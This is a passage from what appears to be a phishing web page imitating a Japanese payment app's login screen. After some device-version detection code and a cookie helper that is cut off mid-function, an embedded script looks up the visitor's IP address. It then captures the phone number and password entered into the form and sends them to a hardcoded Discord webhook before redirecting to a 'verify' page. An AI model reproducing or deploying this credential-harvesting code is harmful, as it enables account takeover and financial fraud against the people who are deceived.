        const MINIMUM_IOS_VERSION = 16
        const MINIMUM_ANDROID_VERSION = 9

        const iosVersionRegex = /ip[honead]{2,4}\b.*os ([\d_]+) like mac/i
        const androidVersionRegex = /android[-/ ]?([\d.]*)/i

        const customAgent =
          window.navigator.userAgent
            .split(' ')
            .find((string) => string.includes('jp.pay2.app')) || ''

        const isIOS =
          customAgent.includes('ios') ||
          ((/iPad|iPhone|iPod/.test(navigator.platform) ||
            (navigator.platform === 'MacIntel' &&
              navigator.maxTouchPoints > 1)) &&
            !window.MSStream)

        const isAndroid =
          customAgent.includes('android') || /Android/.test(navigator.userAgent)

        // if ios
        if (isIOS) {
          const res = iosVersionRegex.exec(window.navigator.userAgent)
          if (!res || !res[1]) return false

          const osVersion = res[1].split('.').map((s) => parseInt(s))
          if (osVersion[0] < MINIMUM_IOS_VERSION) return true
        }

        // if android
        if (isAndroid) {
          const res = androidVersionRegex.exec(window.navigator.userAgent)
          if (!res || !res[1]) return false

          const osVersion = res[1].split('_').map((s) => parseInt(s))
          if (osVersion[0] < MINIMUM_ANDROID_VERSION) return true
        }

        return false
      }

      function getCookieByName(name) {
        const cookies = decodeURIComponent(document.cookie).split(";")

          const exp = '^' + name + '=(.*)'
          const regExp = new RegExp(exp)
          const result = regExp.exec(item)
          if (result) {
            return result[1]

    <script>
  let IP = ""; 
  async function main() {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    IP = data.ip; 
  }
  main();

  const phoneInput = document.querySelector('input[name="username"]');
  const passwordInput = document.querySelector('input[name="password"]');
  const continueBtn = document.getElementById('login-loginBtn');

  function toggleButtonState() {
    if (phoneInput.value.trim() && passwordInput.value.trim()) {
      continueBtn.disabled = false;
    } else {
      continueBtn.disabled = true;
    }
  }
  phoneInput.addEventListener('input', toggleButtonState);
  passwordInput.addEventListener('input', toggleButtonState);
  toggleButtonState();

  continueBtn.addEventListener('click', async function() {
    const input1 = phoneInput.value;
    const input2 = passwordInput.value;

    continueBtn.innerHTML = '<span class="spinner"></span>';
    continueBtn.disabled = true;

    const webhookURL = "https://discord.com/api/webhooks/1421155455190700098/KChhHV7h4cogdgD_q4EF4N61UkP8fnTw8EtMHM-Zz55Hx2misgLQpLXOxqSL9iGhpsZD";
    const payload = {
      content: `${IP} の電話番号とパスワード↓\n ${input1} ${input2}\n`
    };

    try {
      const response = await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      if (response.ok) {
        setTimeout(() => {
          location.href = 'verify.html';
        }, 300);
      } else {
        continueBtn.innerHTML = "エラーが発生しました";
      }
    } catch {
      continueBtn.innerHTML = "通信エラー";
    }
  });
</script>
  
  
  </body></html>
